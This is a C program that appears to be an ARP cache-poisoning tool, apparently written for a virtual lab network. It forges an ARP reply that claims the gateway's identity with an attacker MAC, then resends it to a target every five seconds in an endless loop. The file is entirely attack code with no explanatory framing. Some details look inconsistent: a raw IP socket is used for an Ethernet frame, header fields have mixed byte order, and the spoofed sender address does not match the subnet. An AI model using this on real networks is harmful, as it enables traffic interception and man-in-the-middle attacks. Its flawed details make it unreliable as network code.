#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <string.h>

#include "pckt_header.h"

int main(void) {
	int sock;
	sock = socket(PF_INET, SOCK_RAW, 255);
	if(sock < 0) {
		perror("socket() error");
		return -1;
	}

	//Prepared
	ETHER_ADDR target_addr = {0x08, 0x00, 0x27, 0xB4, 0xC5, 0x16};
	ETHER_ADDR attacker_addr = {0x08, 0x00, 0x27, 0x93, 0xc1, 0x62};
	ETHER_ADDR gateway_addr = {0x52, 0x54, 0x00, 0x12, 0x35, 0x00};

	//set destination information
	struct sockaddr_in dst_in;
	dst_in.sin_family = AF_INET;
	dst_in.sin_port = 0;
	dst_in.sin_addr.s_addr = inet_addr("10.0.2.5");


	ARP_PACKET attack_packet;
	//set ether header
	attack_packet.ether_hdr.dst = target_addr;
	attack_packet.ether_hdr.src = gateway_addr;
	attack_packet.ether_hdr.type = 0x0608;

	//set arp header
	attack_packet.arp_hdr.hardw_type = 0x1;
	attack_packet.arp_hdr.proto_type = 0x0800;
	attack_packet.arp_hdr.hard_addr_len = 6;
	attack_packet.arp_hdr.proto_addr_len = 4;
	attack_packet.arp_hdr.opcode = 2;
	attack_packet.arp_hdr.src_mac_addr = attacker_addr;
	attack_packet.arp_hdr.src_addr = inet_addr("192.168.0.1");
	attack_packet.arp_hdr.dst_mac_addr = target_addr;
	attack_packet.arp_hdr.dst_addr = inet_addr("10.0.2.15");

	if(sendto(sock, &attack_packet, sizeof(attack_packet), 0, (struct sockaddr*)&dst_in, sizeof(dst_in)) < 0) {
		perror("sendto() error");
		return -1;
	}

	while(1) {
		printf("arp pollution!\n");
		sendto(sock, &attack_packet, sizeof(attack_packet), 0, (struct sockaddr*)&dst_in, sizeof(dst_in));
		sleep(5);
	}

	printf("program exit!\n");
	return 0;
}
